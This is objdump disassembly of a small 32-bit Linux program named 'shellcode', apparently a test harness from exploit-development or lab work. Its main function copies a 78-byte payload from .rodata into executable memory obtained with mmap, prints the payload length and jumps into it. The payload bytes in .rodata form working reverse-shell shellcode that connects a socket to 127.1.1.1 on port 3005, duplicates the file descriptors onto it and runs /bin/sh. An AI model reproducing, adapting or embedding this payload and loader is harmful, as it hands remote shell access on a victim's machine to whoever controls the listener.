
shellcode:     format de fichier elf32-i386


Déassemblage de la section .interp :

00000194 <.interp>:
 194:	2f                   	das    
 195:	6c                   	insb   (%dx),%es:(%edi)
 196:	69 62 2f 6c 64 2d 6c 	imul   $0x6c2d646c,0x2f(%edx),%esp
 19d:	69 6e 75 78 2e 73 6f 	imul   $0x6f732e78,0x75(%esi),%ebp
 1a4:	2e 32 00             	xor    %cs:(%eax),%al

Déassemblage de la section .note.ABI-tag :

000001a8 <.note.ABI-tag>:
 1a8:	04 00                	add    $0x0,%al
 1aa:	00 00                	add    %al,(%eax)
 1ac:	10 00                	adc    %al,(%eax)
 1ae:	00 00                	add    %al,(%eax)
 1b0:	01 00                	add    %eax,(%eax)
 1b2:	00 00                	add    %al,(%eax)
 1b4:	47                   	inc    %edi
 1b5:	4e                   	dec    %esi
 1b6:	55                   	push   %ebp
 1b7:	00 00                	add    %al,(%eax)
 1b9:	00 00                	add    %al,(%eax)
 1bb:	00 03                	add    %al,(%ebx)
 1bd:	00 00                	add    %al,(%eax)
 1bf:	00 02                	add    %al,(%edx)
 1c1:	00 00                	add    %al,(%eax)
 1c3:	00 00                	add    %al,(%eax)
 1c5:	00 00                	add    %al,(%eax)
	...

Déassemblage de la section .note.gnu.build-id :

000001c8 <.note.gnu.build-id>:
 1c8:	04 00                	add    $0x0,%al
 1ca:	00 00                	add    %al,(%eax)
 1cc:	14 00                	adc    $0x0,%al
 1ce:	00 00                	add    %al,(%eax)
 1d0:	03 00                	add    (%eax),%eax
 1d2:	00 00                	add    %al,(%eax)
 1d4:	47                   	inc    %edi
 1d5:	4e                   	dec    %esi
 1d6:	55                   	push   %ebp
 1d7:	00 ab ba 8e a1 83    	add    %ch,-0x7c5e7146(%ebx)
 1dd:	4e                   	dec    %esi
 1de:	21 cf                	and    %ecx,%edi
 1e0:	b7 14                	mov    $0x14,%bh
 1e2:	7b cf                	jnp    1b3 <_init-0xe4d>
 1e4:	9e                   	sahf   
 1e5:	e7 37                	out    %eax,$0x37
 1e7:	bc 86 87 c2 50       	mov    $0x50c28786,%esp

Déassemblage de la section .gnu.hash :

000001ec <.gnu.hash>:
 1ec:	02 00                	add    (%eax),%al
 1ee:	00 00                	add    %al,(%eax)
 1f0:	09 00                	or     %eax,(%eax)
 1f2:	00 00                	add    %al,(%eax)
 1f4:	01 00                	add    %eax,(%eax)
 1f6:	00 00                	add    %al,(%eax)
 1f8:	05 00 00 00 00       	add    $0x0,%eax
 1fd:	20 00                	and    %al,(%eax)
 1ff:	20 00                	and    %al,(%eax)
 201:	00 00                	add    %al,(%eax)
 203:	00 09                	add    %cl,(%ecx)
 205:	00 00                	add    %al,(%eax)
 207:	00                   	.byte 0x0
 208:	ad                   	lods   %ds:(%esi),%eax
 209:	4b                   	dec    %ebx
 20a:	e3 c0                	jecxz  1cc <_init-0xe34>

Déassemblage de la section .dynsym :

0000020c <.dynsym>:
	...
 21c:	64 00 00             	add    %al,%fs:(%eax)
	...
 227:	00 20                	add    %ah,(%eax)
 229:	00 00                	add    %al,(%eax)
 22b:	00 1a                	add    %bl,(%edx)
	...
 235:	00 00                	add    %al,(%eax)
 237:	00 12                	add    %dl,(%edx)
 239:	00 00                	add    %al,(%eax)
 23b:	00 2d 00 00 00 00    	add    %ch,0x0
 241:	00 00                	add    %al,(%eax)
 243:	00 00                	add    %al,(%eax)
 245:	00 00                	add    %al,(%eax)
 247:	00 22                	add    %ah,(%edx)
 249:	00 00                	add    %al,(%eax)
 24b:	00 80 00 00 00 00    	add    %al,0x0(%eax)
 251:	00 00                	add    %al,(%eax)
 253:	00 00                	add    %al,(%eax)
 255:	00 00                	add    %al,(%eax)
 257:	00 20                	add    %ah,(%eax)
 259:	00 00                	add    %al,(%eax)
 25b:	00 21                	add    %ah,(%ecx)
	...
 265:	00 00                	add    %al,(%eax)
 267:	00 12                	add    %dl,(%edx)
 269:	00 00                	add    %al,(%eax)
 26b:	00 26                	add    %ah,(%esi)
	...
 275:	00 00                	add    %al,(%eax)
 277:	00 12                	add    %dl,(%edx)
 279:	00 00                	add    %al,(%eax)
 27b:	00 3c 00             	add    %bh,(%eax,%eax,1)
	...
 286:	00 00                	add    %al,(%eax)
 288:	12 00                	adc    (%eax),%al
 28a:	00 00                	add    %al,(%eax)
 28c:	8f 00                	popl   (%eax)
	...
 296:	00 00                	add    %al,(%eax)
 298:	20 00                	and    %al,(%eax)
 29a:	00 00                	add    %al,(%eax)
 29c:	0b 00                	or     (%eax),%eax
 29e:	00 00                	add    %al,(%eax)
 2a0:	04 20                	add    $0x20,%al
 2a2:	00 00                	add    %al,(%eax)
 2a4:	04 00                	add    $0x0,%al
 2a6:	00 00                	add    %al,(%eax)
 2a8:	11 00                	adc    %eax,(%eax)
 2aa:	10 00                	adc    %al,(%eax)

Déassemblage de la section .dynstr :

000002ac <.dynstr>:
 2ac:	00 6c 69 62          	add    %ch,0x62(%ecx,%ebp,2)
 2b0:	63 2e                	arpl   %bp,(%esi)
 2b2:	73 6f                	jae    323 <_init-0xcdd>
 2b4:	2e 36 00 5f 49       	cs add %bl,%ss:0x49(%edi)
 2b9:	4f                   	dec    %edi
 2ba:	5f                   	pop    %edi
 2bb:	73 74                	jae    331 <_init-0xccf>
 2bd:	64 69 6e 5f 75 73 65 	imul   $0x64657375,%fs:0x5f(%esi),%ebp
 2c4:	64 
 2c5:	00 70 72             	add    %dh,0x72(%eax)
 2c8:	69 6e 74 66 00 6d 6d 	imul   $0x6d6d0066,0x74(%esi),%ebp
 2cf:	61                   	popa   
 2d0:	70 00                	jo     2d2 <_init-0xd2e>
 2d2:	73 74                	jae    348 <_init-0xcb8>
 2d4:	72 6c                	jb     342 <_init-0xcbe>
 2d6:	65 6e                	outsb  %gs:(%esi),(%dx)
 2d8:	00 5f 5f             	add    %bl,0x5f(%edi)
 2db:	63 78 61             	arpl   %di,0x61(%eax)
 2de:	5f                   	pop    %edi
 2df:	66 69 6e 61 6c 69    	imul   $0x696c,0x61(%esi),%bp
 2e5:	7a 65                	jp     34c <_init-0xcb4>
 2e7:	00 5f 5f             	add    %bl,0x5f(%edi)
 2ea:	6c                   	insb   (%dx),%es:(%edi)
 2eb:	69 62 63 5f 73 74 61 	imul   $0x6174735f,0x63(%edx),%esp
 2f2:	72 74                	jb     368 <_init-0xc98>
 2f4:	5f                   	pop    %edi
 2f5:	6d                   	insl   (%dx),%es:(%edi)
 2f6:	61                   	popa   
 2f7:	69 6e 00 47 4c 49 42 	imul   $0x42494c47,0x0(%esi),%ebp
 2fe:	43                   	inc    %ebx
 2ff:	5f                   	pop    %edi
 300:	32 2e                	xor    (%esi),%ch
 302:	31 2e                	xor    %ebp,(%esi)
 304:	33 00                	xor    (%eax),%eax
 306:	47                   	inc    %edi
 307:	4c                   	dec    %esp
 308:	49                   	dec    %ecx
 309:	42                   	inc    %edx
 30a:	43                   	inc    %ebx
 30b:	5f                   	pop    %edi
 30c:	32 2e                	xor    (%esi),%ch
 30e:	30 00                	xor    %al,(%eax)
 310:	5f                   	pop    %edi
 311:	49                   	dec    %ecx
 312:	54                   	push   %esp
 313:	4d                   	dec    %ebp
 314:	5f                   	pop    %edi
 315:	64 65 72 65          	fs gs jb 37e <_init-0xc82>
 319:	67 69 73 74 65 72 54 	imul   $0x4d547265,0x74(%bp,%di),%esi
 320:	4d 
 321:	43                   	inc    %ebx
 322:	6c                   	insb   (%dx),%es:(%edi)
 323:	6f                   	outsl  %ds:(%esi),(%dx)
 324:	6e                   	outsb  %ds:(%esi),(%dx)
 325:	65 54                	gs push %esp
 327:	61                   	popa   
 328:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
 32c:	5f                   	pop    %edi
 32d:	5f                   	pop    %edi
 32e:	67 6d                	insl   (%dx),%es:(%di)
 330:	6f                   	outsl  %ds:(%esi),(%dx)
 331:	6e                   	outsb  %ds:(%esi),(%dx)
 332:	5f                   	pop    %edi
 333:	73 74                	jae    3a9 <_init-0xc57>
 335:	61                   	popa   
 336:	72 74                	jb     3ac <_init-0xc54>
 338:	5f                   	pop    %edi
 339:	5f                   	pop    %edi
 33a:	00 5f 49             	add    %bl,0x49(%edi)
 33d:	54                   	push   %esp
 33e:	4d                   	dec    %ebp
 33f:	5f                   	pop    %edi
 340:	72 65                	jb     3a7 <_init-0xc59>
 342:	67 69 73 74 65 72 54 	imul   $0x4d547265,0x74(%bp,%di),%esi
 349:	4d 
 34a:	43                   	inc    %ebx
 34b:	6c                   	insb   (%dx),%es:(%edi)
 34c:	6f                   	outsl  %ds:(%esi),(%dx)
 34d:	6e                   	outsb  %ds:(%esi),(%dx)
 34e:	65 54                	gs push %esp
 350:	61                   	popa   
 351:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)

Déassemblage de la section .gnu.version :

00000356 <.gnu.version>:
 356:	00 00                	add    %al,(%eax)
 358:	00 00                	add    %al,(%eax)
 35a:	02 00                	add    (%eax),%al
 35c:	03 00                	add    (%eax),%eax
 35e:	00 00                	add    %al,(%eax)
 360:	02 00                	add    (%eax),%al
 362:	02 00                	add    (%eax),%al
 364:	02 00                	add    (%eax),%al
 366:	00 00                	add    %al,(%eax)
 368:	01 00                	add    %eax,(%eax)

Déassemblage de la section .gnu.version_r :

0000036c <.gnu.version_r>:
 36c:	01 00                	add    %eax,(%eax)
 36e:	02 00                	add    (%eax),%al
 370:	01 00                	add    %eax,(%eax)
 372:	00 00                	add    %al,(%eax)
 374:	10 00                	adc    %al,(%eax)
 376:	00 00                	add    %al,(%eax)
 378:	00 00                	add    %al,(%eax)
 37a:	00 00                	add    %al,(%eax)
 37c:	73 1f                	jae    39d <_init-0xc63>
 37e:	69 09 00 00 03 00    	imul   $0x30000,(%ecx),%ecx
 384:	4e                   	dec    %esi
 385:	00 00                	add    %al,(%eax)
 387:	00 10                	add    %dl,(%eax)
 389:	00 00                	add    %al,(%eax)
 38b:	00 10                	add    %dl,(%eax)
 38d:	69 69 0d 00 00 02 00 	imul   $0x20000,0xd(%ecx),%ebp
 394:	5a                   	pop    %edx
 395:	00 00                	add    %al,(%eax)
 397:	00 00                	add    %al,(%eax)
 399:	00 00                	add    %al,(%eax)
	...

Déassemblage de la section .rel.dyn :

0000039c <.rel.dyn>:
 39c:	f4                   	hlt    
 39d:	3e 00 00             	add    %al,%ds:(%eax)
 3a0:	08 00                	or     %al,(%eax)
 3a2:	00 00                	add    %al,(%eax)
 3a4:	f8                   	clc    
 3a5:	3e 00 00             	add    %al,%ds:(%eax)
 3a8:	08 00                	or     %al,(%eax)
 3aa:	00 00                	add    %al,(%eax)
 3ac:	f8                   	clc    
 3ad:	3f                   	aas    
 3ae:	00 00                	add    %al,(%eax)
 3b0:	08 00                	or     %al,(%eax)
 3b2:	00 00                	add    %al,(%eax)
 3b4:	20 40 00             	and    %al,0x0(%eax)
 3b7:	00 08                	add    %cl,(%eax)
 3b9:	00 00                	add    %al,(%eax)
 3bb:	00 ec                	add    %ch,%ah
 3bd:	3f                   	aas    
 3be:	00 00                	add    %al,(%eax)
 3c0:	06                   	push   %es
 3c1:	01 00                	add    %eax,(%eax)
 3c3:	00 f0                	add    %dh,%al
 3c5:	3f                   	aas    
 3c6:	00 00                	add    %al,(%eax)
 3c8:	06                   	push   %es
 3c9:	03 00                	add    (%eax),%eax
 3cb:	00 f4                	add    %dh,%ah
 3cd:	3f                   	aas    
 3ce:	00 00                	add    %al,(%eax)
 3d0:	06                   	push   %es
 3d1:	04 00                	add    $0x0,%al
 3d3:	00 fc                	add    %bh,%ah
 3d5:	3f                   	aas    
 3d6:	00 00                	add    %al,(%eax)
 3d8:	06                   	push   %es
 3d9:	08 00                	or     %al,(%eax)
	...

Déassemblage de la section .rel.plt :

000003dc <.rel.plt>:
 3dc:	0c 40                	or     $0x40,%al
 3de:	00 00                	add    %al,(%eax)
 3e0:	07                   	pop    %es
 3e1:	02 00                	add    (%eax),%al
 3e3:	00 10                	add    %dl,(%eax)
 3e5:	40                   	inc    %eax
 3e6:	00 00                	add    %al,(%eax)
 3e8:	07                   	pop    %es
 3e9:	05 00 00 14 40       	add    $0x40140000,%eax
 3ee:	00 00                	add    %al,(%eax)
 3f0:	07                   	pop    %es
 3f1:	06                   	push   %es
 3f2:	00 00                	add    %al,(%eax)
 3f4:	18 40 00             	sbb    %al,0x0(%eax)
 3f7:	00 07                	add    %al,(%edi)
 3f9:	07                   	pop    %es
	...

Déassemblage de la section .init :

00001000 <_init>:
    1000:	53                   	push   %ebx
    1001:	83 ec 08             	sub    $0x8,%esp
    1004:	e8 b7 00 00 00       	call   10c0 <__x86.get_pc_thunk.bx>
    1009:	81 c3 f7 2f 00 00    	add    $0x2ff7,%ebx
    100f:	8b 83 f4 ff ff ff    	mov    -0xc(%ebx),%eax
    1015:	85 c0                	test   %eax,%eax
    1017:	74 02                	je     101b <_init+0x1b>
    1019:	ff d0                	call   *%eax
    101b:	83 c4 08             	add    $0x8,%esp
    101e:	5b                   	pop    %ebx
    101f:	c3                   	ret    

Déassemblage de la section .plt :

00001020 <.plt>:
    1020:	ff b3 04 00 00 00    	pushl  0x4(%ebx)
    1026:	ff a3 08 00 00 00    	jmp    *0x8(%ebx)
    102c:	00 00                	add    %al,(%eax)
	...

00001030 <printf@plt>:
    1030:	ff a3 0c 00 00 00    	jmp    *0xc(%ebx)
    1036:	68 00 00 00 00       	push   $0x0
    103b:	e9 e0 ff ff ff       	jmp    1020 <.plt>

00001040 <mmap@plt>:
    1040:	ff a3 10 00 00 00    	jmp    *0x10(%ebx)
    1046:	68 08 00 00 00       	push   $0x8
    104b:	e9 d0 ff ff ff       	jmp    1020 <.plt>

00001050 <strlen@plt>:
    1050:	ff a3 14 00 00 00    	jmp    *0x14(%ebx)
    1056:	68 10 00 00 00       	push   $0x10
    105b:	e9 c0 ff ff ff       	jmp    1020 <.plt>

00001060 <__libc_start_main@plt>:
    1060:	ff a3 18 00 00 00    	jmp    *0x18(%ebx)
    1066:	68 18 00 00 00       	push   $0x18
    106b:	e9 b0 ff ff ff       	jmp    1020 <.plt>

Déassemblage de la section .plt.got :

00001070 <__cxa_finalize@plt>:
    1070:	ff a3 f0 ff ff ff    	jmp    *-0x10(%ebx)
    1076:	66 90                	xchg   %ax,%ax

Déassemblage de la section .text :

00001080 <_start>:
    1080:	31 ed                	xor    %ebp,%ebp
    1082:	5e                   	pop    %esi
    1083:	89 e1                	mov    %esp,%ecx
    1085:	83 e4 f0             	and    $0xfffffff0,%esp
    1088:	50                   	push   %eax
    1089:	54                   	push   %esp
    108a:	52                   	push   %edx
    108b:	e8 22 00 00 00       	call   10b2 <_start+0x32>
    1090:	81 c3 70 2f 00 00    	add    $0x2f70,%ebx
    1096:	8d 83 f0 d2 ff ff    	lea    -0x2d10(%ebx),%eax
    109c:	50                   	push   %eax
    109d:	8d 83 90 d2 ff ff    	lea    -0x2d70(%ebx),%eax
    10a3:	50                   	push   %eax
    10a4:	51                   	push   %ecx
    10a5:	56                   	push   %esi
    10a6:	ff b3 f8 ff ff ff    	pushl  -0x8(%ebx)
    10ac:	e8 af ff ff ff       	call   1060 <__libc_start_main@plt>
    10b1:	f4                   	hlt    
    10b2:	8b 1c 24             	mov    (%esp),%ebx
    10b5:	c3                   	ret    
    10b6:	66 90                	xchg   %ax,%ax
    10b8:	66 90                	xchg   %ax,%ax
    10ba:	66 90                	xchg   %ax,%ax
    10bc:	66 90                	xchg   %ax,%ax
    10be:	66 90                	xchg   %ax,%ax

000010c0 <__x86.get_pc_thunk.bx>:
    10c0:	8b 1c 24             	mov    (%esp),%ebx
    10c3:	c3                   	ret    
    10c4:	66 90                	xchg   %ax,%ax
    10c6:	66 90                	xchg   %ax,%ax
    10c8:	66 90                	xchg   %ax,%ax
    10ca:	66 90                	xchg   %ax,%ax
    10cc:	66 90                	xchg   %ax,%ax
    10ce:	66 90                	xchg   %ax,%ax

000010d0 <deregister_tm_clones>:
    10d0:	e8 e0 00 00 00       	call   11b5 <__x86.get_pc_thunk.dx>
    10d5:	81 c2 2b 2f 00 00    	add    $0x2f2b,%edx
    10db:	8d 8a 24 00 00 00    	lea    0x24(%edx),%ecx
    10e1:	8d 82 24 00 00 00    	lea    0x24(%edx),%eax
    10e7:	39 c8                	cmp    %ecx,%eax
    10e9:	74 1d                	je     1108 <deregister_tm_clones+0x38>
    10eb:	8b 82 ec ff ff ff    	mov    -0x14(%edx),%eax
    10f1:	85 c0                	test   %eax,%eax
    10f3:	74 13                	je     1108 <deregister_tm_clones+0x38>
    10f5:	55                   	push   %ebp
    10f6:	89 e5                	mov    %esp,%ebp
    10f8:	83 ec 14             	sub    $0x14,%esp
    10fb:	51                   	push   %ecx
    10fc:	ff d0                	call   *%eax
    10fe:	83 c4 10             	add    $0x10,%esp
    1101:	c9                   	leave  
    1102:	c3                   	ret    
    1103:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
    1107:	90                   	nop
    1108:	c3                   	ret    
    1109:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi

00001110 <register_tm_clones>:
    1110:	e8 a0 00 00 00       	call   11b5 <__x86.get_pc_thunk.dx>
    1115:	81 c2 eb 2e 00 00    	add    $0x2eeb,%edx
    111b:	55                   	push   %ebp
    111c:	89 e5                	mov    %esp,%ebp
    111e:	53                   	push   %ebx
    111f:	8d 8a 24 00 00 00    	lea    0x24(%edx),%ecx
    1125:	8d 82 24 00 00 00    	lea    0x24(%edx),%eax
    112b:	83 ec 04             	sub    $0x4,%esp
    112e:	29 c8                	sub    %ecx,%eax
    1130:	c1 f8 02             	sar    $0x2,%eax
    1133:	89 c3                	mov    %eax,%ebx
    1135:	c1 eb 1f             	shr    $0x1f,%ebx
    1138:	01 d8                	add    %ebx,%eax
    113a:	d1 f8                	sar    %eax
    113c:	74 14                	je     1152 <register_tm_clones+0x42>
    113e:	8b 92 fc ff ff ff    	mov    -0x4(%edx),%edx
    1144:	85 d2                	test   %edx,%edx
    1146:	74 0a                	je     1152 <register_tm_clones+0x42>
    1148:	83 ec 08             	sub    $0x8,%esp
    114b:	50                   	push   %eax
    114c:	51                   	push   %ecx
    114d:	ff d2                	call   *%edx
    114f:	83 c4 10             	add    $0x10,%esp
    1152:	8b 5d fc             	mov    -0x4(%ebp),%ebx
    1155:	c9                   	leave  
    1156:	c3                   	ret    
    1157:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
    115e:	66 90                	xchg   %ax,%ax

00001160 <__do_global_dtors_aux>:
    1160:	55                   	push   %ebp
    1161:	89 e5                	mov    %esp,%ebp
    1163:	53                   	push   %ebx
    1164:	e8 57 ff ff ff       	call   10c0 <__x86.get_pc_thunk.bx>
    1169:	81 c3 97 2e 00 00    	add    $0x2e97,%ebx
    116f:	83 ec 04             	sub    $0x4,%esp
    1172:	80 bb 24 00 00 00 00 	cmpb   $0x0,0x24(%ebx)
    1179:	75 27                	jne    11a2 <__do_global_dtors_aux+0x42>
    117b:	8b 83 f0 ff ff ff    	mov    -0x10(%ebx),%eax
    1181:	85 c0                	test   %eax,%eax
    1183:	74 11                	je     1196 <__do_global_dtors_aux+0x36>
    1185:	83 ec 0c             	sub    $0xc,%esp
    1188:	ff b3 20 00 00 00    	pushl  0x20(%ebx)
    118e:	e8 dd fe ff ff       	call   1070 <__cxa_finalize@plt>
    1193:	83 c4 10             	add    $0x10,%esp
    1196:	e8 35 ff ff ff       	call   10d0 <deregister_tm_clones>
    119b:	c6 83 24 00 00 00 01 	movb   $0x1,0x24(%ebx)
    11a2:	8b 5d fc             	mov    -0x4(%ebp),%ebx
    11a5:	c9                   	leave  
    11a6:	c3                   	ret    
    11a7:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
    11ae:	66 90                	xchg   %ax,%ax

000011b0 <frame_dummy>:
    11b0:	e9 5b ff ff ff       	jmp    1110 <register_tm_clones>

000011b5 <__x86.get_pc_thunk.dx>:
    11b5:	8b 14 24             	mov    (%esp),%edx
    11b8:	c3                   	ret    

000011b9 <main>:
    11b9:	8d 4c 24 04          	lea    0x4(%esp),%ecx
    11bd:	83 e4 f0             	and    $0xfffffff0,%esp
    11c0:	ff 71 fc             	pushl  -0x4(%ecx)
    11c3:	55                   	push   %ebp
    11c4:	89 e5                	mov    %esp,%ebp
    11c6:	57                   	push   %edi
    11c7:	56                   	push   %esi
    11c8:	53                   	push   %ebx
    11c9:	51                   	push   %ecx
    11ca:	83 ec 68             	sub    $0x68,%esp
    11cd:	e8 ee fe ff ff       	call   10c0 <__x86.get_pc_thunk.bx>
    11d2:	81 c3 2e 2e 00 00    	add    $0x2e2e,%ebx
    11d8:	8d 45 96             	lea    -0x6a(%ebp),%eax
    11db:	8d 93 24 e0 ff ff    	lea    -0x1fdc(%ebx),%edx
    11e1:	b9 4e 00 00 00       	mov    $0x4e,%ecx
    11e6:	8b 32                	mov    (%edx),%esi
    11e8:	89 30                	mov    %esi,(%eax)
    11ea:	8b 74 0a fc          	mov    -0x4(%edx,%ecx,1),%esi
    11ee:	89 74 08 fc          	mov    %esi,-0x4(%eax,%ecx,1)
    11f2:	8d 78 04             	lea    0x4(%eax),%edi
    11f5:	83 e7 fc             	and    $0xfffffffc,%edi
    11f8:	29 f8                	sub    %edi,%eax
    11fa:	29 c2                	sub    %eax,%edx
    11fc:	01 c1                	add    %eax,%ecx
    11fe:	83 e1 fc             	and    $0xfffffffc,%ecx
    1201:	89 c8                	mov    %ecx,%eax
    1203:	c1 e8 02             	shr    $0x2,%eax
    1206:	89 d6                	mov    %edx,%esi
    1208:	89 c1                	mov    %eax,%ecx
    120a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
    120c:	83 ec 0c             	sub    $0xc,%esp
    120f:	8d 45 96             	lea    -0x6a(%ebp),%eax
    1212:	50                   	push   %eax
    1213:	e8 38 fe ff ff       	call   1050 <strlen@plt>
    1218:	83 c4 10             	add    $0x10,%esp
    121b:	83 ec 08             	sub    $0x8,%esp
    121e:	50                   	push   %eax
    121f:	8d 83 08 e0 ff ff    	lea    -0x1ff8(%ebx),%eax
    1225:	50                   	push   %eax
    1226:	e8 05 fe ff ff       	call   1030 <printf@plt>
    122b:	83 c4 10             	add    $0x10,%esp
    122e:	83 ec 08             	sub    $0x8,%esp
    1231:	6a 00                	push   $0x0
    1233:	6a ff                	push   $0xffffffff
    1235:	6a 21                	push   $0x21
    1237:	6a 07                	push   $0x7
    1239:	6a 4e                	push   $0x4e
    123b:	6a 00                	push   $0x0
    123d:	e8 fe fd ff ff       	call   1040 <mmap@plt>
    1242:	83 c4 20             	add    $0x20,%esp
    1245:	89 45 e4             	mov    %eax,-0x1c(%ebp)
    1248:	8b 45 e4             	mov    -0x1c(%ebp),%eax
    124b:	89 c2                	mov    %eax,%edx
    124d:	8d 45 96             	lea    -0x6a(%ebp),%eax
    1250:	b9 4e 00 00 00       	mov    $0x4e,%ecx
    1255:	8b 18                	mov    (%eax),%ebx
    1257:	89 1a                	mov    %ebx,(%edx)
    1259:	8b 5c 08 fc          	mov    -0x4(%eax,%ecx,1),%ebx
    125d:	89 5c 0a fc          	mov    %ebx,-0x4(%edx,%ecx,1)
    1261:	8d 5a 04             	lea    0x4(%edx),%ebx
    1264:	83 e3 fc             	and    $0xfffffffc,%ebx
    1267:	29 da                	sub    %ebx,%edx
    1269:	29 d0                	sub    %edx,%eax
    126b:	01 d1                	add    %edx,%ecx
    126d:	83 e1 fc             	and    $0xfffffffc,%ecx
    1270:	89 ca                	mov    %ecx,%edx
    1272:	c1 ea 02             	shr    $0x2,%edx
    1275:	89 df                	mov    %ebx,%edi
    1277:	89 c6                	mov    %eax,%esi
    1279:	89 d1                	mov    %edx,%ecx
    127b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
    127d:	8b 45 e4             	mov    -0x1c(%ebp),%eax
    1280:	ff d0                	call   *%eax
    1282:	90                   	nop
    1283:	8d 65 f0             	lea    -0x10(%ebp),%esp
    1286:	59                   	pop    %ecx
    1287:	5b                   	pop    %ebx
    1288:	5e                   	pop    %esi
    1289:	5f                   	pop    %edi
    128a:	5d                   	pop    %ebp
    128b:	8d 61 fc             	lea    -0x4(%ecx),%esp
    128e:	c3                   	ret    
    128f:	90                   	nop

00001290 <__libc_csu_init>:
    1290:	55                   	push   %ebp
    1291:	57                   	push   %edi
    1292:	56                   	push   %esi
    1293:	53                   	push   %ebx
    1294:	e8 27 fe ff ff       	call   10c0 <__x86.get_pc_thunk.bx>
    1299:	81 c3 67 2d 00 00    	add    $0x2d67,%ebx
    129f:	83 ec 0c             	sub    $0xc,%esp
    12a2:	8b 6c 24 28          	mov    0x28(%esp),%ebp
    12a6:	e8 55 fd ff ff       	call   1000 <_init>
    12ab:	8d b3 f8 fe ff ff    	lea    -0x108(%ebx),%esi
    12b1:	8d 83 f4 fe ff ff    	lea    -0x10c(%ebx),%eax
    12b7:	29 c6                	sub    %eax,%esi
    12b9:	c1 fe 02             	sar    $0x2,%esi
    12bc:	74 1f                	je     12dd <__libc_csu_init+0x4d>
    12be:	31 ff                	xor    %edi,%edi
    12c0:	83 ec 04             	sub    $0x4,%esp
    12c3:	55                   	push   %ebp
    12c4:	ff 74 24 2c          	pushl  0x2c(%esp)
    12c8:	ff 74 24 2c          	pushl  0x2c(%esp)
    12cc:	ff 94 bb f4 fe ff ff 	call   *-0x10c(%ebx,%edi,4)
    12d3:	83 c7 01             	add    $0x1,%edi
    12d6:	83 c4 10             	add    $0x10,%esp
    12d9:	39 fe                	cmp    %edi,%esi
    12db:	75 e3                	jne    12c0 <__libc_csu_init+0x30>
    12dd:	83 c4 0c             	add    $0xc,%esp
    12e0:	5b                   	pop    %ebx
    12e1:	5e                   	pop    %esi
    12e2:	5f                   	pop    %edi
    12e3:	5d                   	pop    %ebp
    12e4:	c3                   	ret    
    12e5:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
    12ec:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi

000012f0 <__libc_csu_fini>:
    12f0:	c3                   	ret    

Déassemblage de la section .fini :

000012f4 <_fini>:
    12f4:	53                   	push   %ebx
    12f5:	83 ec 08             	sub    $0x8,%esp
    12f8:	e8 c3 fd ff ff       	call   10c0 <__x86.get_pc_thunk.bx>
    12fd:	81 c3 03 2d 00 00    	add    $0x2d03,%ebx
    1303:	83 c4 08             	add    $0x8,%esp
    1306:	5b                   	pop    %ebx
    1307:	c3                   	ret    

Déassemblage de la section .rodata :

00002000 <_fp_hw>:
    2000:	03 00                	add    (%eax),%eax
	...

00002004 <_IO_stdin_used>:
    2004:	01 00                	add    %eax,(%eax)
    2006:	02 00                	add    (%eax),%al
    2008:	5b                   	pop    %ebx
    2009:	2b 5d 20             	sub    0x20(%ebp),%ebx
    200c:	73 68                	jae    2076 <__GNU_EH_FRAME_HDR+0x2>
    200e:	65 6c                	gs insb (%dx),%es:(%edi)
    2010:	6c                   	insb   (%dx),%es:(%edi)
    2011:	63 6f 64             	arpl   %bp,0x64(%edi)
    2014:	65 20 6c 65 6e       	and    %ch,%gs:0x6e(%ebp,%eiz,2)
    2019:	67 74 68             	addr16 je 2084 <__GNU_EH_FRAME_HDR+0x10>
    201c:	3a 20                	cmp    (%eax),%ah
    201e:	25 75 0a 00 00       	and    $0xa75,%eax
    2023:	00 31                	add    %dh,(%ecx)
    2025:	c0 31 db             	shlb   $0xdb,(%ecx)
    2028:	31 c9                	xor    %ecx,%ecx
    202a:	68 7f 01 01 01       	push   $0x101017f
    202f:	66 68 0b bd          	pushw  $0xbd0b
    2033:	66 b8 67 01          	mov    $0x167,%ax
    2037:	b3 02                	mov    $0x2,%bl
    2039:	66 53                	push   %bx
    203b:	41                   	inc    %ecx
    203c:	31 d2                	xor    %edx,%edx
    203e:	cd 80                	int    $0x80
    2040:	89 c3                	mov    %eax,%ebx
    2042:	66 b8 6a 01          	mov    $0x16a,%ax
    2046:	89 e1                	mov    %esp,%ecx
    2048:	b2 10                	mov    $0x10,%dl
    204a:	cd 80                	int    $0x80
    204c:	50                   	push   %eax
    204d:	68 6e 2f 73 68       	push   $0x68732f6e
    2052:	68 2f 2f 62 69       	push   $0x69622f2f
    2057:	04 03                	add    $0x3,%al
    2059:	89 c1                	mov    %eax,%ecx
    205b:	b0 3f                	mov    $0x3f,%al
    205d:	49                   	dec    %ecx
    205e:	cd 80                	int    $0x80
    2060:	75 f9                	jne    205b <_IO_stdin_used+0x57>
    2062:	89 c8                	mov    %ecx,%eax
    2064:	b2 0b                	mov    $0xb,%dl
    2066:	92                   	xchg   %eax,%edx
    2067:	8d 1c 24             	lea    (%esp),%ebx
    206a:	89 e3                	mov    %esp,%ebx
    206c:	cd 80                	int    $0x80
    206e:	40                   	inc    %eax
    206f:	31 db                	xor    %ebx,%ebx
	...

Déassemblage de la section .eh_frame_hdr :

00002074 <__GNU_EH_FRAME_HDR>:
    2074:	01 1b                	add    %ebx,(%ebx)
    2076:	03 3b                	add    (%ebx),%edi
    2078:	38 00                	cmp    %al,(%eax)
    207a:	00 00                	add    %al,(%eax)
    207c:	06                   	push   %es
    207d:	00 00                	add    %al,(%eax)
    207f:	00 ac ef ff ff 80 00 	add    %ch,0x80ffff(%edi,%ebp,8)
    2086:	00 00                	add    %al,(%eax)
    2088:	fc                   	cld    
    2089:	ef                   	out    %eax,(%dx)
    208a:	ff                   	(bad)  
    208b:	ff a4 00 00 00 0c f0 	jmp    *-0xff40000(%eax,%eax,1)
    2092:	ff                   	(bad)  
    2093:	ff 54 00 00          	call   *0x0(%eax,%eax,1)
    2097:	00 45 f1             	add    %al,-0xf(%ebp)
    209a:	ff                   	(bad)  
    209b:	ff                   	(bad)  
